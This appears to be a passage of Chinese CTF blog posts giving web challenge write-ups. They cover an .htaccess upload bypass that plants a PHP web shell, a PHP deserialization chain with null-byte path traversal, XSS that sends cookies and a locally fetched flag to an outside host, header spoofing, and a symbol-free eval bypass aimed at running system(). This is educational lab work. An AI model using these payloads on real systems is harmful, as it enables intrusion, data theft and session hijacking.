class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$text_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$text_filename</span>;</span><br><span class="line">        <span class="title function_ invoke__">rename</span>(<span class="variable">$text_tmp_file</span>, <span class="variable">$text_file_path</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题目花里胡哨，其实挺简单的，主要还是考察细心，这里有两个上传处理的函数：1、upload_as_image  2、upload_as_text </p>
<p>其中upload_as_text看似过滤严格，但是黑名单中.htaccess这个加了一个.就导致这个后缀是可以饶过的。所以我们可以通过upload_as_text上传.htaccess进行文件上传的利用。</p>
<p>上传文件.htaccess</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9</span><br><span class="line">Content-Disposition: form-data; name=&quot;hw_file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">test</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9--</span><br></pre></td></tr></table></figure>

<p>目录需要遍历时间戳得到在<a href="http://eci-2zei6d9vvhdroisf54t1.cloudeci1.ichunqiu.com/uploads/files/20220827113034/.htaccess">&#x2F;uploads&#x2F;files&#x2F;20220827113034&#x2F;.htaccess</a></p>
<p>但是每次上传的这个时间戳都不一样，这就没办法使用.htaccess进行getshell，但是我们还有一个函数upload_as_image：</p>
<p>这个函数没有禁止进行目录翻阅，所以我们可以上传一个指定目录的test.jpg 进行getshell。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /public/index.php/index/index/upload.html?hw_file_name=../../files/20220827113034/test HTTP/1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9</span><br><span class="line">Content-Disposition: form-data; name=&quot;hw_file&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/plain</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php echo &quot;Shell&quot;;system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9--</span><br></pre></td></tr></table></figure>

<p>访问这个图片马去拿flag</p>
<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>首先打开题目就是源码，源码中有一个game参数是可以被反序列化的，所以只需要找一个利用链就行了。</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;count = <span class="string">&quot;one&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;try &quot;</span>.<span class="variable language_">$this</span>-&gt;count.<span class="string">&quot; again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*\/\/.*/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\..\..*/&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我是从下往上看的首先就看到了One这个类的destruct进行了字符串拼接，很明显就能想象到会调用__tostring函数,所以查找tostring发现类abaaba存在tostring，所以我们把$this-&gt;count 指向abaaba的对应对象上既可以进入abaaba。</p>
<p>然后abaaba类的tostring调用了一个不存在的属性(Giveme)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;-</span><br></pre></td></tr></table></figure>

<p>调用不存在的属性时会调用__get魔术方法从而进行对$this-&gt;DoNotGet-&gt;$name的设置。而设置一个不存在的属性会调用魔术方法set，所以我们就关注下 类suhasuha：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>suhasuha的set方法正好触发危险函数可以调用一个无参构造方法，所以我们可以将这个方法设为类Onemore的readfile，尽管readfile有参数，但是无参也是可以执行的 会走到image拼接路径那一步：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何制定action调用类的指定方法呢？</p>
<p>用数组：$this-&gt;action&#x3D;array(new Onemore(),”readfile”);</p>
<p>然后我们设定Onemore类中的file参数就能进行任意目录文件读取，但是safe中过滤了一些参数，好像是不能饶过，但是可以通过00饶过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Onemore</span>-&gt;file = <span class="string">&quot;..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/flag&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们的思路整理完了，但是如果我们直接生成对象并根据思路进行赋值时会发现报错：</p>
<p>类abaaba的DoNotGet属性时protected的，是无法外部赋值的，对于这种私有和保护的属性进行处理时，如果他不是序列化中必须的参数，可以直接删除，如果必须要用到且是无法外部调用的，那么我们就可以使用__construct构造函数进行内部赋值，也就是说可以直接在new对象的时候就完成属性赋值。</p>
<p>最终的payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable">$suhasuha</span> = <span class="keyword">new</span> <span class="title function_ invoke__">suhasuha</span>();</span><br><span class="line">    	<span class="variable">$Onemore</span> = <span class="keyword">new</span> <span class="title class_">Onemore</span>();</span><br><span class="line">    	<span class="variable">$Onemore</span>-&gt;file = <span class="string">&quot;..\x00/..\x00/flag.php&quot;</span>;</span><br><span class="line">    	<span class="variable">$suhasuha</span>-&gt;action = <span class="keyword">array</span>(<span class="variable">$Onemore</span>,<span class="string">&quot;readfile&quot;</span>);</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;DoNotGet = <span class="variable">$suhasuha</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="comment"># private 修改</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;count = <span class="string">&quot;one&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;try &quot;</span>.<span class="variable language_">$this</span>-&gt;count.<span class="string">&quot; again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*\/\/.*/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\..\..*/&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span> = <span class="keyword">new</span> <span class="title class_">One</span>();</span><br><span class="line"><span class="variable">$abaaba</span> = <span class="keyword">new</span> <span class="title function_ invoke__">abaaba</span>();</span><br><span class="line"><span class="variable">$one</span>-&gt;count = <span class="variable">$abaaba</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$one</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="xss盲打和本地请求伪造"><a href="#xss盲打和本地请求伪造" class="headerlink" title="xss盲打和本地请求伪造"></a>xss盲打和本地请求伪造</h3><p>这道题目其实挺简单的先xss打cookie,我这里使用的是如下payload(这个不唯一)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://xxxx.xxx.com/cookie.php?c=&quot;</span>%2bdocument.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到提示：GET &#x2F;a?cookie&#x3D;hint&#x3D;Visit%20&#x2F;g3t_fl4g%20to%20get%20flag HTTP&#x2F;1.1</p>
<p>我们直接访问&#x2F;g3t_fl4g提示本地访问，一般来说我们的这个伪造本地header中只有以下几种方法：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>

<p>但是这里都不行，再结合xss可以想到是利用xss伪造管理员本地发一个请求，再把响应携带出来，很容易就想到用AJAX。</p>
<p>但是这里对XMLHttpRequest有过滤，我们只需要简单的饶过一下即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ajx = <span class="built_in">eval</span>(<span class="string">&quot;new XMLH&quot;</span>+<span class="string">&quot;ttpR&quot;</span>+<span class="string">&quot;equest&quot;</span>);<span class="comment">//拼接绕过。</span></span><br><span class="line">    ajx.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/g3t_fl4g&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    ajx.<span class="title function_">send</span>();</span><br><span class="line">    ajx.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(ajx.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ajx.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">                ajx.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://VPS:5555/?flag=&quot;</span> + ajx.<span class="property">responseText</span>,<span class="literal">true</span>);</span><br><span class="line">                ajx.<span class="title function_">send</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们的vps上面就会收到flag了。</p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>web狗真是没啥出路，卷不动CTF了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏程杯CTF-两道有意思的题目</title>
    <url>//posts/PCL-CTF-WEB2/</url>
    <content><![CDATA[<p>其实这次web题目质量一般，可能web只有一道题目做起来让人觉得知识点和考察方式都很好，既简单又困难的那种感觉吧，web题目应该是AK了，但是有一部分没啥营养，这里就记录下两道题目：</p>
<p>1、简单的php </p>
<p>2、高手高手高高手</p>
<h2 id="简单的php"><a href="#简单的php" class="headerlink" title="简单的php"></a>简单的php</h2><p>这道题目其实以前也遇到过，不过这里过滤了更多的东西，中心思想还是一致的，我们首先看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>第一个考点是无符号执行，就是基本各种符号都被过滤了，我们直接来看下还剩什么，一般剩什么就是考什么：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$code</span>=<span class="string">&quot;～1234567890-=qwertyuiop[]asdfghjkl;&#x27;zxcvbnm,./!@#$%^&amp;*()_+QWERTYUIOP&#123;&#125;ASDFGHJKL:\\ \&quot;ZXCVBNM&lt;&gt;?&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据上述代码可得到可用字符如下：[];!@#%*()_{}:&lt;</p>
<p>基本上题目要不留一个 ^ 让你异或出来～继续拼装(也可以异或其他出来，全凭想象)，要不就给你留下来这个～。这里有这个～，直接就可以开干，首先基本上可见字符的取反都是不可见字符，不可见字符当然符合这个无字符正则，所以可以用不可见字符取反绕过正则，这里也写一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//system(end(getheaders()))</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;end&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;getheaders&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二个考点是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure>

<p>也就是payload经过循环过滤后仅剩下;  也就是payload只能是无参的形式：a(abc(dsada())); 这种</p>
<p>那我们就用一些特殊函数：</p>
